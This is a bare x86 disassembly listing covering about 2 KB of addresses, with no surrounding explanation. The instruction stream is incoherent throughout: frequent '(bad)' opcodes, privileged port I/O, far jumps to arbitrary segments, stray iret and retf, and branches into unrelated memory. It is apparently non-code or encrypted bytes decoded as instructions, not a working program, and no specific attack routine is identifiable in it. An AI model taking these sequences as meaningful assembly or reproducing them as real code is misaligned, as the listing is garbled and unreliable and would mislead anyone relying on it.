  4165ab:	jmp    0x11d71c4a
  4165b0:	aas    
  4165b1:	xor    al,0x40
  4165b3:	nop
  4165b4:	mul    DWORD PTR ds:0x23460c4f
  4165ba:	arpl   WORD PTR [eax-0x27b160b],dx
  4165c0:	arpl   WORD PTR [edi-0x546053d7],si
  4165c6:	pop    esi
  4165c7:	push   ss
  4165c8:	(bad)  
  4165c9:	cld    
  4165ca:	dec    ebx
  4165cb:	arpl   WORD PTR [edi+0x21],bx
  4165ce:	adc    al,0xfe
  4165d0:	mov    al,0x4c
  4165d2:	scas   eax,DWORD PTR es:[edi]
  4165d3:	add    al,0x1e
  4165d5:	pushf  
  4165d6:	sub    esp,DWORD PTR [ecx+0x14dc045a]
  4165dc:	mov    cl,0xab
  4165de:	add    DWORD PTR [eax+edx*1],edi
  4165e1:	sar    dl,0xaa
  4165e4:	or     ecx,DWORD PTR [ecx]
  4165e6:	cmp    DWORD PTR [ebp+0x2d],edx
  4165e9:	xor    al,bl
  4165eb:	mov    ds:0x49b1d590,al
  4165f0:	ins    DWORD PTR es:[edi],dx
  4165f1:	cmp    bl,BYTE PTR [eax]
  4165f3:	mov    DWORD PTR ds:0x395d5a4c,ebp
  4165f9:	push   ax
  4165fb:	aad    0x59
  4165fd:	cli    
  4165fe:	pop    ebx
  4165ff:	iret   
  416600:	loop   0x41658c
  416602:	test   BYTE PTR ds:0x8c8f57d4,cl
  416608:	xchg   ebx,eax
  416609:	cmpxchg BYTE PTR [ebx-0x52],bl
  41660d:	inc    edi
  41660e:	ror    BYTE PTR [eax+0xc],1
  416611:	ret    
  416612:	xor    bl,ah
  416614:	xchg   esi,eax
  416615:	xchg   edx,eax
  416616:	cmp    DWORD PTR [edi-0x3f2185bd],0xffffffe8
  41661d:	fidiv  WORD PTR [eax]
  41661f:	in     al,0x65
  416621:	add    eax,0x9df9b271
  416626:	fldcw  WORD PTR [eax+0x72487263]
  41662c:	mov    esp,es
  41662e:	push   esp
  41662f:	xor    al,0x88
  416631:	sub    eax,0xbf6022f1
  416636:	xchg   esi,eax
  416637:	(bad)  
  416638:	push   0x31
  41663a:	adc    eax,0x6bc855f5
  41663f:	out    0x9,al
  416641:	and    DWORD PTR [ebx-0x38],edi
  416644:	mov    ds:0x1e3fe35e,eax
  416649:	repnz sub BYTE PTR [ecx-0x44856c66],bl
  416650:	(bad)  
  416651:	mov    bh,0x7
  416653:	js     0x416655
  416655:	sub    ebp,ebp
  416657:	push   esi
  416658:	pushf  
  416659:	push   esi
  41665a:	inc    edi
  41665b:	push   ebx
  41665c:	pop    ss
  41665d:	mov    DWORD PTR [esi-0x99757b8],eax
  416663:	imul   edi,DWORD PTR [edx],0x66254d30
  416669:	les    esp,FWORD PTR [edx-0xa]
  41666c:	pop    ebp
  41666d:	mov    ch,0xdf
  41666f:	push   DWORD PTR [ebx]
  416671:	mov    bl,0x3d
  416673:	out    dx,eax
  416674:	bound  ebx,QWORD PTR [ecx+edi*2]
  416677:	push   eax
  416678:	scas   al,BYTE PTR es:[edi]
  416679:	gs mov bh,0x94
  41667c:	add    eax,DWORD PTR [edx-0x3cac5b6f]
  416682:	mul    ah
  416684:	pop    edi
  416685:	mul    esi
  416687:	dec    edi
  416688:	(bad)  
  416689:	lds    edx,FWORD PTR [edx+0x785382de]
  41668f:	mov    edx,edi
  416691:	scas   al,BYTE PTR es:[edi]
  416692:	sbb    eax,0x9049fbce
  416697:	cmp    BYTE PTR [ebx-0x1a],dl
  41669a:	xchg   esi,eax
  41669b:	(bad)  
  41669c:	cmc    
  41669d:	xor    al,BYTE PTR [ebp+0x3e764358]
  4166a3:	adc    BYTE PTR [edi+0x1762501c],ah
  4166a9:	and    bl,BYTE PTR [ecx+0x3b]
  4166ac:	daa    
  4166ad:	mov    ah,0xd8
  4166af:	mov    edx,0x256336a7
  4166b4:	ss dec ecx
  4166b6:	pop    esi
  4166b7:	fisub  DWORD PTR [ebx+0x1f]
  4166ba:	fldcw  WORD PTR [eax-0x5ce86f3f]
  4166c0:	dec    esi
  4166c1:	xor    dh,BYTE PTR [eax]
  4166c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166c4:	push   edi
  4166c5:	out    dx,eax
  4166c6:	mov    al,ds:0x40c16e2d
  4166cb:	aam    0xbd
  4166cd:	jle    0x4166ed
  4166cf:	les    ebp,FWORD PTR [edi]
  4166d1:	popa   
  4166d2:	push   ss
  4166d3:	test   BYTE PTR [esi-0x54],bl
  4166d6:	push   ebp
  4166d7:	lds    eax,FWORD PTR [edi+0x4a]
  4166da:	pusha  
  4166db:	les    edx,FWORD PTR [ebx+0x20]
  4166de:	mov    cl,0xe7
  4166e0:	mov    dl,0x9c
  4166e2:	sbb    eax,eax
  4166e4:	cmp    ebp,ebx
  4166e6:	sbb    BYTE PTR [ecx+0x6ec382c0],dl
  4166ec:	enter  0x3f91,0x11
  4166f0:	dec    ebp
  4166f1:	jae    0x416746
  4166f3:	sbb    BYTE PTR [eax+esi*2],bh
  4166f6:	mov    ah,0xb5
  4166f8:	xchg   esp,eax
  4166f9:	lock sbb DWORD PTR [esi+0x18],edx
  4166fd:	mov    gs,WORD PTR [edi+0x72e81411]
  416703:	mov    BYTE PTR [ebx+esi*2-0x6],bh
  416707:	mov    eax,ds:0xef6cc1a5
  41670c:	pop    es
  41670d:	out    dx,eax
  41670e:	mov    edx,0x1d431e11
  416713:	push   es
  416714:	dec    ecx
  416715:	mov    DWORD PTR [eax+0x0],ebp
  416718:	cdq    
  416719:	nop
  41671a:	add    BYTE PTR [eax+esi*8-0x6041b8c4],0xd7
  416722:	jg     0x416729
  416724:	pop    esp
  416725:	and    al,0xba
  416727:	pop    edi
  416728:	in     eax,0xbf
  41672a:	jo     0x4166c7
  41672c:	sub    eax,0x86d25723
  416731:	imul   edi,ebp,0x4074f95b
  416737:	(bad)  
  416738:	ja     0x416741
  41673a:	xor    esi,DWORD PTR [edi-0x3b]
  41673d:	pop    ds
  41673e:	and    eax,0xfdd44790
  416743:	push   ds
  416744:	and    BYTE PTR [edi+0x757a170f],ah
  41674a:	lea    esp,[ebx+0x4b17913e]
  416750:	rcr    BYTE PTR [esi],cl
  416752:	xlat   BYTE PTR ds:[ebx]
  416753:	jge    0x4166de
  416755:	or     DWORD PTR [edi],ecx
  416757:	in     eax,0xe0
  416759:	imul   edi,DWORD PTR ds:[eax+ebp*1+0xe361315],0x742df4de
  416765:	pop    esi
  416766:	out    0xa2,al
  416768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416769:	lods   al,BYTE PTR ds:[esi]
  41676a:	xor    dl,ah
  41676c:	dec    edi
  41676d:	call   0xed1a:0x19f4249c
  416774:	and    esi,DWORD PTR [ecx]
  416776:	fsubr  DWORD PTR [edi]
  416778:	mov    ds:0xb5c123d8,al
  41677d:	dec    esi
  41677e:	jns    0x416789
  416780:	ficom  WORD PTR [ebx+0x5d]
  416783:	xor    dl,ah
  416785:	iret   
  416786:	(bad)  [ecx]
  416788:	addr16 inc edx
  41678a:	scas   eax,DWORD PTR es:[edi]
  41678b:	arpl   sp,sp
  41678d:	stos   DWORD PTR es:[edi],eax
  41678e:	out    dx,eax
  41678f:	mov    edx,DWORD PTR [edx-0x7]
  416792:	sbb    DWORD PTR [esi],esi
  416794:	jns    0x41676d
  416796:	or     cl,ch
  416798:	add    al,0x9d
  41679a:	cmp    DWORD PTR [esi-0x2a],esi
  41679d:	shl    DWORD PTR [eax],1
  41679f:	jge    0x416735
  4167a1:	cs (bad) 
  4167a3:	out    0x2d,al
  4167a5:	pop    ebx
  4167a6:	pop    esi
  4167a7:	je     0x41676b
  4167a9:	retf   
  4167aa:	and    eax,0xfe2a05ac
  4167af:	sbb    al,0xa8
  4167b1:	(bad)  
  4167b2:	xor    esi,DWORD PTR [esi-0x1b]
  4167b5:	inc    DWORD PTR [bx]
  4167b8:	sub    ecx,DWORD PTR [ecx-0x14d57a07]
  4167be:	mov    ah,0xae
  4167c0:	jae    0x4167b1
  4167c2:	out    0xb2,eax
  4167c4:	scas   al,BYTE PTR es:[edi]
  4167c5:	or     dl,0x28
  4167c8:	xor    DWORD PTR [edx+0x3e],ebp
  4167cb:	sti    
  4167cc:	test   DWORD PTR [esi],ecx
  4167ce:	jp     0x416772
  4167d0:	sahf   
  4167d1:	pop    ss
  4167d2:	ins    BYTE PTR es:[edi],dx
  4167d3:	xchg   esi,eax
  4167d4:	aaa    
  4167d5:	rcl    DWORD PTR [ebp-0x6913ea7f],cl
  4167db:	mov    ds:0x1df0b0b5,eax
  4167e0:	add    eax,0xbb28821a
  4167e5:	les    edi,FWORD PTR [ebx]
  4167e7:	xchg   BYTE PTR [ecx-0x74],ah
  4167ea:	push   eax
  4167eb:	repz loopne 0x4167a9
  4167ee:	fldcw  WORD PTR [ebp-0x2d24d874]
  4167f4:	pop    edx
  4167f5:	push   es
  4167f6:	sub    al,0x3f
  4167f8:	test   eax,0x56c5c64d
  4167fd:	jge    0x4167a0
  4167ff:	test   al,0xea
  416801:	jmp    0x7acd11d2
  416806:	push   edx
  416807:	iret   
  416808:	loop   0x416797
  41680a:	sub    al,0x6d
  41680c:	iret   
  41680d:	cmp    ch,BYTE PTR ds:0xba20aeaa
  416813:	sub    DWORD PTR [edx],ebp
  416815:	aaa    
  416816:	js     0x4167fa
  416818:	sbb    eax,0xbb41585f
  41681d:	imul   ecx,DWORD PTR [eax],0xb01a84d5
  416823:	into   
  416824:	lods   eax,DWORD PTR ds:[esi]
  416825:	test   eax,0xa5ac192d
  41682a:	xor    DWORD PTR [ebx],0xfffffff2
  41682d:	pop    ebp
  41682e:	jmp    0xa036:0x62589912
  416835:	in     al,dx
  416836:	and    ebx,esp
  416838:	(bad)  
  41683a:	push   eax
  41683b:	aam    0x58
  41683d:	add    ah,BYTE PTR [edx-0x1eadd7ee]
  416843:	jnp    0x416829
  416845:	repnz int3 
  416847:	icebp  
  416848:	retf   
  416849:	enter  0x66b9,0x0
  41684d:	cmp    dh,BYTE PTR ds:0xa35b9401
  416853:	loop   0x4168c3
  416855:	or     BYTE PTR es:[eax+0x31293cb2],bl
  41685c:	popf   
  41685d:	fistp  DWORD PTR [edi+0x60548efc]
  416863:	aas    
  416864:	pop    esi
  416865:	pop    edi
  416866:	add    al,0xb
  416868:	(bad)  
  416869:	cmc    
  41686a:	retf   0x20f0
  41686d:	jo     0x4168b6
  41686f:	sub    DWORD PTR [ebp+eiz*2+0x2adcdfcf],0x6f8ad868
  41687a:	fimul  WORD PTR ds:0x3499c063
  416880:	in     al,dx
  416881:	sub    al,0xc9
  416883:	mov    cl,0x82
  416885:	xlat   BYTE PTR ds:[ebx]
  416886:	mov    dl,0xf6
  416888:	mov    WORD PTR [esi-0x6c8e8fdd],gs
  41688e:	or     dl,BYTE PTR [esi+0x78fbccfa]
  416894:	push   esi
  416895:	cld    
  416896:	and    eax,0x4b57a912
  41689b:	jno    0x4168fd
  41689d:	call   0xd10e:0x8fa3177f
  4168a4:	pop    edx
  4168a5:	fldenv [eax-0x62]
  4168a8:	enter  0x80cf,0xbd
  4168ac:	sub    al,0x4b
  4168ae:	int    0x81
  4168b0:	pop    edx
  4168b1:	(bad)  
  4168b2:	sti    
  4168b3:	mov    fs,WORD PTR [edx+0x41840a92]
  4168b9:	or     DWORD PTR [edi-0x3ef7bcae],0xfffffff1
  4168c0:	test   BYTE PTR [eax-0x4a238e13],0xa7
  4168c7:	inc    ebx
  4168c8:	jle    0x41690b
  4168ca:	pop    ecx
  4168cb:	jmp    0xc601:0x6760a599
  4168d2:	arpl   di,ax
  4168d4:	mov    ch,BYTE PTR [ecx-0x71]
  4168d7:	xor    al,0xf0
  4168d9:	mov    esp,0x28269ade
  4168de:	cmp    eax,0xee034db2
  4168e3:	push   edi
  4168e4:	xchg   ebx,eax
  4168e5:	sbb    al,0xc6
  4168e7:	jl     0x4168d3
  4168e9:	adc    cl,BYTE PTR [edi-0x61702100]
  4168ef:	pop    ebp
  4168f0:	ss retf 0xf47f
  4168f4:	in     eax,dx
  4168f5:	sub    BYTE PTR [eax-0x753308ce],dl
  4168fb:	jg     0x4168a2
  4168fd:	leave  
  4168fe:	cwde   
  4168ff:	pushf  
  416900:	mov    WORD PTR [esi+ebx*1-0x73],?
  416904:	enter  0x23fa,0xb6
  416908:	and    bh,0x6b
  41690b:	dec    esp
  41690c:	jl     0x416894
  41690e:	aas    
  41690f:	pop    ecx
  416910:	jmp    0x41692b
  416912:	add    ch,BYTE PTR [ebx]
  416914:	xchg   DWORD PTR [edi+0x426b8660],esi
  41691a:	jns    0x4168fe
  41691c:	mov    ds:0xc9844085,al
  416921:	mov    ds,WORD PTR [esi+esi*8-0x6b744142]
  416928:	mov    BYTE PTR [ebp+0x2f8a16e1],ch
  41692e:	add    al,bl
  416930:	inc    esi
  416931:	xchg   ecx,eax
  416932:	test   eax,0xa1b8556
  416937:	test   eax,0xa8e60a9
  41693c:	ins    BYTE PTR es:[edi],dx
  41693d:	(bad)  
  41693f:	scas   al,BYTE PTR es:[edi]
  416940:	jg     0x4168e3
  416942:	inc    ebp
  416943:	dec    eax
  416944:	sub    al,al
  416946:	mov    edi,eax
  416948:	sar    dl,0xf8
  41694b:	sbb    DWORD PTR [ecx+0x12],edi
  41694e:	xchg   ebx,eax
  41694f:	je     0x41692b
  416951:	cmp    eax,0xc5f80ee1
  416956:	push   0x1e0f0310
  41695b:	pusha  
  41695c:	into   
  41695d:	mov    ah,0xd3
  41695f:	fsub   st(4),st
  416961:	fs or  ebx,eax
  416964:	and    al,BYTE PTR [ebp-0x65]
  416967:	daa    
  416968:	adc    dl,BYTE PTR [ebp+0x3cc2a6c1]
  41696e:	cmp    esi,DWORD PTR [edi-0x4f]
  416971:	mov    al,0xa6
  416973:	fcmovne st,st(3)
  416975:	and    eax,0xc562555
  41697a:	push   es
  41697b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41697c:	xor    DWORD PTR [edx+edx*1+0x2d94e774],edi
  416983:	adc    dl,ah
  416985:	adc    eax,0x3122cdee
  41698a:	ins    BYTE PTR es:[edi],dx
  41698b:	and    al,0x26
  41698d:	push   edx
  41698e:	pop    esi
  41698f:	xor    bl,bh
  416991:	int    0xa6
  416993:	stos   DWORD PTR es:[edi],eax
  416994:	inc    ebx
  416995:	imul   edx,DWORD PTR [edi+0x63]
  416999:	out    0x4d,eax
  41699b:	jg     0x4169e4
  41699d:	test   DWORD PTR [ebx],ebp
  41699f:	out    dx,al
  4169a0:	lahf   
  4169a1:	out    0x5,eax
  4169a3:	(bad)  
  4169a4:	fdivr  QWORD PTR [ebp-0x441d29cb]
  4169aa:	cmp    esp,DWORD PTR [eax+0x4a]
  4169ad:	popa   
  4169ae:	xor    eax,0x2e1bf4d
  4169b3:	(bad)
  4169b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169b7:	push   edx
  4169b8:	fcmovnu st,st(7)
  4169ba:	hlt    
  4169bb:	mov    ah,0xda
  4169bd:	dec    ebx
  4169be:	cmp    edi,DWORD PTR [edx]
  4169c0:	loopne 0x41694d
  4169c2:	add    BYTE PTR [edi+0x15],dh
  4169c5:	mov    dl,0x3d
  4169c7:	inc    esi
  4169c8:	pop    DWORD PTR [esi-0x45]
  4169cb:	and    esp,DWORD PTR [ebx-0x11]
  4169ce:	mov    DWORD PTR [edx],edx
  4169d0:	push   edx
  4169d1:	retf   0x3086
  4169d4:	out    dx,eax
  4169d5:	mov    eax,ds:0x9c9d6de4
  4169da:	sub    al,0x60
  4169dc:	inc    edx
  4169dd:	mov    bh,0xd5
  4169df:	enter  0x1978,0xbb
  4169e3:	jmp    0xb4c5215a
  4169e8:	mov    edx,0x5d8f0c32
  4169ed:	adc    ebp,eax
  4169ef:	(bad)  
  4169f0:	shl    bl,cl
  4169f2:	adc    DWORD PTR [edx+0xa],eax
  4169f5:	lods   eax,DWORD PTR ds:[esi]
  4169f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169f7:	aam    0xa3
  4169f9:	test   al,bl
  4169fb:	inc    eax
  4169fc:	popa   
  4169fd:	dec    ecx
  4169fe:	cmp    BYTE PTR [edx],ah
  416a00:	mov    esi,0x6dc8a048
  416a05:	iret   
  416a06:	mov    DWORD PTR [edx-0x14],ebx
  416a09:	push   ecx
  416a0a:	sub    bh,0xb5
  416a0d:	jecxz  0x4169cc
  416a0f:	pop    esp
  416a10:	popa   
  416a11:	leave  
  416a12:	mov    al,ds:0xeb3d3cf6
  416a17:	adc    BYTE PTR [ebx+edx*2],0x6f
  416a1b:	jne    0x416a36
  416a1d:	lahf   
  416a1e:	xchg   ebx,eax
  416a1f:	cmp    DWORD PTR [ecx],0x5c
  416a22:	cmp    ebx,DWORD PTR [ebx+0x62]
  416a25:	je     0x416a42
  416a27:	in     eax,dx
  416a28:	sti    
  416a29:	sub    ebx,DWORD PTR [ebx]
  416a2b:	lea    edi,[eax]
  416a2d:	pusha  
  416a2e:	inc    esi
  416a2f:	mov    edx,0xc86c0475
  416a34:	and    dl,BYTE PTR [eax]
  416a36:	pop    ss
  416a37:	out    dx,eax
  416a38:	out    dx,eax
  416a39:	mov    BYTE PTR [edi+0x25],bh
  416a3c:	pop    edi
  416a3d:	sub    DWORD PTR gs:[ecx],esi
  416a40:	mov    ch,0x5
  416a42:	push   edx
  416a43:	xor    eax,0x802faced
  416a48:	loopne 0x416ab4
  416a4a:	add    BYTE PTR [ebx],dl
  416a4c:	jo     0x416a39
  416a4e:	int3   
  416a4f:	aas    
  416a50:	xchg   edx,eax
  416a51:	sbb    al,0x56
  416a53:	(bad)  
  416a54:	iret   
  416a55:	in     eax,dx
  416a56:	pop    eax
  416a57:	cld    
  416a58:	(bad)  
  416a59:	leave  
  416a5a:	jecxz  0x416a99
  416a5c:	push   ss
  416a5d:	add    al,0x28
  416a5f:	popa   
  416a60:	imul   eax,DWORD PTR [ecx-0x4b],0xffffffd7
  416a64:	mov    ch,0xc9
  416a66:	push   0xffffffd9
  416a68:	rcr    DWORD PTR [ebx+esi*2-0x1749dfe4],cl
  416a6f:	jmp    0x416a7d
  416a71:	ss rcl cl,0x9f
  416a75:	add    eax,0x830fb397
  416a7a:	shr    edx,1
  416a7c:	and    BYTE PTR [eax-0x15891e30],0xbc
  416a83:	adc    eax,0x87de999c
  416a88:	sub    DWORD PTR [edi-0x7e05779a],edx
  416a8e:	in     eax,0x93
  416a90:	test   bl,cl
  416a92:	and    ecx,eax
  416a94:	int    0xda
  416a96:	not    DWORD PTR [esi-0x4daab7d2]
  416a9c:	xchg   edi,eax
  416a9d:	icebp  
  416a9e:	mov    ebp,0x57cde0a2
  416aa3:	repz in al,0xe6
  416aa6:	jno    0x416ad1
  416aa8:	mov    WORD PTR [eax],ds
  416aaa:	dec    ecx
  416aab:	fcomp  st(5)
  416aad:	sbb    eax,DWORD PTR [bx+si+0x79]
  416ab1:	and    DWORD PTR [ebx-0x5a21d676],ebx
  416ab7:	push   ss
  416ab8:	adc    DWORD PTR [di+0x56],eax
  416abc:	mov    ds:0x4756b7c8,eax
  416ac1:	pop    ds
  416ac2:	fadd   QWORD PTR [esi]
  416ac4:	loope  0x416ac5
  416ac6:	sbb    BYTE PTR [ecx+0x4],cl
  416ac9:	bound  ebx,QWORD PTR [eax-0x1e]
  416acc:	jp     0x416a6d
  416ace:	sbb    DWORD PTR [ecx+0x1eaa3cec],eax
  416ad4:	test   DWORD PTR [ebp+eax*8-0x75],ebx
  416ad8:	cs add eax,esi
  416adb:	xor    DWORD PTR [edi],0xffffffea
  416ade:	fmul   QWORD PTR [eax-0x3c1b2802]
  416ae4:	jb     0x416b35
  416ae6:	ins    BYTE PTR es:[edi],dx
  416ae7:	dec    esi
  416ae8:	sahf   
  416ae9:	push   ds
  416aea:	out    dx,al
  416aeb:	mov    al,ds:0xddb6268d
  416af0:	std    
  416af1:	cld    
  416af2:	(bad)  
  416af3:	stc    
  416af4:	enter  0xac8d,0x83
  416af8:	ret    
  416af9:	ja     0x416b5b
  416afb:	cmp    cl,bl
  416afd:	call   DWORD PTR [esp+ebx*2-0x7b]
  416b01:	adc    al,0x90
  416b03:	lahf   
  416b04:	fbld   TBYTE PTR [edi-0x1a812f0d]
  416b0a:	add    DWORD PTR [ecx],eax
  416b0c:	ficom  DWORD PTR [edx-0x6a]
  416b0f:	test   BYTE PTR [edi],ah
  416b11:	jbe    0x416b5b
  416b13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b14:	scas   al,BYTE PTR es:[edi]
  416b15:	sbb    ebp,DWORD PTR ds:0xb7f77108
  416b1b:	iret   
  416b1c:	je     0x416aff
  416b1e:	dec    edi
  416b1f:	leave  
  416b20:	inc    ebp
  416b21:	sub    bl,BYTE PTR [ebp+0x76]
  416b24:	xor    al,0xb6
  416b26:	sbb    eax,0xfacb13d0
  416b2b:	and    al,0xea
  416b2d:	add    BYTE PTR [ecx],bl
  416b2f:	jl     0x416b7e
  416b31:	lea    esi,[edx-0x67b22a2e]
  416b37:	push   cs
  416b38:	add    ch,BYTE PTR [esi-0x1efff030]
  416b3e:	dec    ebp
  416b3f:	(bad)  
  416b40:	test   eax,0x584d19ac
  416b45:	sbb    eax,0x9c910f94
  416b4a:	fild   DWORD PTR [ebx+eiz*1-0x13]
  416b4e:	mov    BYTE PTR [ebp+0x2],bh
  416b51:	xor    BYTE PTR [eax+0x2534a762],dl
  416b57:	(bad)  [edx+0x3d]
  416b5a:	leave  
  416b5b:	shl    BYTE PTR [esi-0x2e246973],0xd6
  416b62:	int    0x3
  416b64:	in     al,0x2
  416b66:	and    eax,0x6edf4263
  416b6b:	in     al,dx
  416b6c:	dec    edx
  416b6d:	leave  
  416b6e:	xchg   edx,eax
  416b6f:	cmp    BYTE PTR [edi-0x6908c68b],dl
  416b75:	into   
  416b76:	and    eax,0x18c0ff34
  416b7b:	mov    ch,0xdf
  416b7d:	stos   DWORD PTR es:[edi],eax
  416b7e:	inc    edi
  416b7f:	add    edx,DWORD PTR [eax+0x1d3b82fb]
  416b85:	xchg   ecx,eax
  416b86:	jmp    0x416b43
  416b88:	lea    ecx,[eax+ecx*1-0x16b782cc]
  416b8f:	pop    esi
  416b90:	arpl   WORD PTR [eax+0x72943d6d],bx
  416b96:	repnz and eax,0x7900eb7e
  416b9c:	jmp    0x840c8778
  416ba1:	mov    ds:0xfcc29cbd,al
  416ba6:	xchg   esp,eax
  416ba7:	xor    al,ch
  416ba9:	int    0x2c
  416bab:	out    0x5b,al
  416bad:	in     eax,dx
  416bae:	pop    ds
  416baf:	loopne 0x416b82
  416bb1:	test   al,0x86
  416bb3:	sahf   
  416bb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bb5:	mov    ecx,0xc6dd7858
  416bba:	in     al,0xe7
  416bbc:	push   esi
  416bbd:	imul   edx,DWORD PTR [ebx],0x5c33d834
  416bc3:	xor    eax,0xb15847e9
  416bc8:	sti    
  416bc9:	cmc    
  416bca:	dec    esp
  416bcb:	and    al,0x2a
  416bcd:	std    
  416bce:	ins    DWORD PTR es:[edi],dx
  416bcf:	dec    eax
  416bd0:	inc    ecx
  416bd1:	aam    0x74
  416bd3:	cdq    
  416bd4:	(bad)  
  416bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bd7:	cli    
  416bd8:	out    dx,al
  416bd9:	mov    al,ds:0x1693a900
  416bde:	inc    edi
  416bdf:	add    al,BYTE PTR [edi-0x1e]
  416be2:	aam    0x67
  416be4:	cmp    al,0xc4
  416be6:	mov    bh,0x5a
  416be8:	(bad)  
  416be9:	sbb    eax,0x228c9a
  416bee:	fldcw  WORD PTR [esi]
  416bf0:	adc    BYTE PTR [edx+0x2630e458],ch
  416bf6:	outs   dx,DWORD PTR ds:[esi]
  416bf7:	push   0x3eaef64b
  416bfc:	pop    ecx
  416bfd:	(bad)  
  416bfe:	mov    BYTE PTR [edx-0x10f59727],ah
  416c04:	in     eax,dx
  416c05:	hlt    
  416c06:	sbb    al,0x34
  416c08:	loopne 0x416bed
  416c0a:	jmp    0xecf5:0x2a8c31cb
  416c11:	loope  0x416c3e
  416c13:	test   BYTE PTR [esi-0x2df5782c],dh
  416c19:	dec    ecx
  416c1a:	jbe    0x416c93
  416c1c:	mov    ah,0x14
  416c1e:	ds and al,0x5
  416c21:	fmul   QWORD PTR [edi-0x834cb76]
  416c27:	sub    BYTE PTR [ebp-0xc6748cc],dl
  416c2d:	ja     0x416bcb
  416c2f:	dec    esi
  416c30:	pop    ds
  416c31:	push   0xfffffff2
  416c33:	(bad)  
  416c34:	fsub   st,st(4)
  416c36:	push   ecx
  416c37:	cmp    BYTE PTR [ebx-0x23a0a869],bl
  416c3d:	and    ebx,DWORD PTR [edx+0x1e]
  416c40:	push   esp
  416c41:	or     al,BYTE PTR [eax-0x78]
  416c44:	es or  cl,ch
  416c47:	mov    edx,0xca859655
  416c4c:	repz cli 
  416c4e:	add    eax,esp
  416c50:	cmp    DWORD PTR [esi+0x16],eax
  416c53:	and    DWORD PTR [edi],edi
  416c55:	lds    ebp,FWORD PTR [esi]
  416c57:	sar    BYTE PTR [ebx-0x1388bd90],0xda
  416c5e:	xor    BYTE PTR [eax],0x5b
  416c61:	xor    eax,0xf76ebde7
  416c66:	pushf  
  416c67:	bound  esi,QWORD PTR ds:0xfb2ec65c
  416c6d:	jmp    0x5059:0x605a68f4
  416c74:	xchg   ebp,eax
  416c75:	inc    eax
  416c76:	add    eax,0x1a6e68da
  416c7b:	cmp    al,0x86
  416c7d:	xchg   ebx,eax
  416c7e:	mov    ch,0x23
  416c80:	inc    ecx
  416c81:	cmp    edx,DWORD PTR [ebx-0x506d788b]
  416c87:	mov    cl,BYTE PTR [eax-0x2b]
  416c8a:	pop    es
  416c8b:	lods   eax,DWORD PTR ds:[esi]
  416c8c:	shr    DWORD PTR [edx],0xc3
  416c8f:	jne    0x416c93
  416c91:	push   esi
  416c92:	jl     0x416c14
  416c94:	pop    esi
  416c95:	mov    ds:0xd06c4cf5,eax
  416c9a:	xchg   edx,eax
  416c9b:	pop    ecx
  416c9c:	jmp    DWORD PTR [eax-0x76254b51]
  416ca2:	mov    esp,0x7944a878
  416ca7:	dec    edx
  416ca8:	int3   
  416ca9:	push   ebx
  416caa:	push   0xffffffb3
  416cac:	add    eax,0x26b4a819
  416cb1:	adc    BYTE PTR [esi-0x6a4423],cl
  416cb7:	push   ecx
  416cb8:	add    eax,0xcea577d8
  416cbd:	fsub   QWORD PTR [ebp-0x78b61280]
  416cc3:	push   esi
  416cc4:	pop    esi
  416cc5:	xor    ebp,esi
  416cc7:	aas    
  416cc8:	scas   eax,DWORD PTR es:[edi]
  416cc9:	sbb    al,0xe0
  416ccb:	xor    eax,0x2342da99
  416cd0:	mov    edx,DWORD PTR [edi+0x2b7e5545]
  416cd6:	dec    ebp
  416cd7:	scas   eax,DWORD PTR es:[edi]
  416cd8:	inc    edi
  416cd9:	das    
  416cda:	add    DWORD PTR [esi-0x27],ecx
  416cdd:	hlt    
  416cde:	and    eax,0xa91321b
  416ce3:	pop    ds
  416ce4:	add    ah,bh
  416ce6:	int    0x64
  416ce8:	xor    al,0x2
  416cea:	les    esp,FWORD PTR [esi]
  416cec:	push   edi
  416ced:	fdivr  DWORD PTR [ecx-0x7ca52afe]
  416cf3:	cmp    al,0xdc
  416cf5:	xor    DWORD PTR [ebx+0x70],esp
  416cf8:	jmp    0xeed6:0x4a241f1c
  416cff:	lea    eax,[ebp-0x59]
  416d02:	clc    
  416d03:	xchg   DWORD PTR [ebx-0x1c],esp
  416d06:	lods   al,BYTE PTR ds:[esi]
  416d07:	je     0x416d02
  416d09:	retf   0xa214
  416d0c:	ds xor eax,0xa1cdde50
  416d13:	dec    ecx
  416d14:	scas   al,BYTE PTR es:[edi]
  416d15:	pop    ebx
  416d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d17:	repnz adc eax,edi
  416d1a:	imul   edx,esp,0x55
  416d1d:	scas   al,BYTE PTR es:[edi]
  416d1e:	int    0x6c
  416d20:	jg     0x416cfc
  416d22:	leave  
  416d23:	mov    ds:0xb25264b3,eax
  416d28:	and    al,0xbf
  416d2a:	fistp  QWORD PTR [esi-0x6]
  416d2d:	push   ebp
  416d2e:	(bad)  
  416d2f:	in     eax,0x5d
  416d31:	and    ecx,ebp
  416d33:	test   al,0xc5
  416d35:	neg    DWORD PTR [ebp+0x3045ff88]
  416d3b:	xor    dl,BYTE PTR [edi]
  416d3d:	sbb    ebx,DWORD PTR [edi+0x192144b3]
  416d43:	jo     0x416d8d
  416d45:	dec    ebx
  416d46:	push   edx
  416d47:	jb     0x416d2a
  416d49:	loopne 0x416d02
  416d4b:	push   esp
  416d4c:	jle    0x416d3f
  416d4e:	inc    esp
  416d4f:	push   0xfffffff9
  416d51:	add    eax,DWORD PTR [edx]
  416d53:	inc    esp
  416d54:	adc    BYTE PTR [ecx-0x3327605c],ah
  416d5a:	lods   al,BYTE PTR ds:[esi]
  416d5b:	mov    ebp,DWORD PTR [eax+eiz*8-0x17]
  416d5f:	push   ecx
  416d60:	fsub   QWORD PTR [edi]
  416d62:	push   0x9bed9ec9
  416d67:	outs   dx,DWORD PTR ds:[esi]
  416d68:	imul   ebx,DWORD PTR [edx-0x25],0xedee1447
  416d6f:	sbb    esi,ebp
  416d71:	lds    ebx,FWORD PTR [edi-0x698f8023]
  416d77:	sbb    DWORD PTR [ebx-0x3d],ebp
  416d7a:	ret    
  416d7b:	add    dh,bh
  416d7d:	imul   eax,ebx,0xae94a003
  416d83:	popa   
  416d84:	or     BYTE PTR [ecx-0x118469f8],al
  416d8a:	dec    edi
  416d8b:	stc    
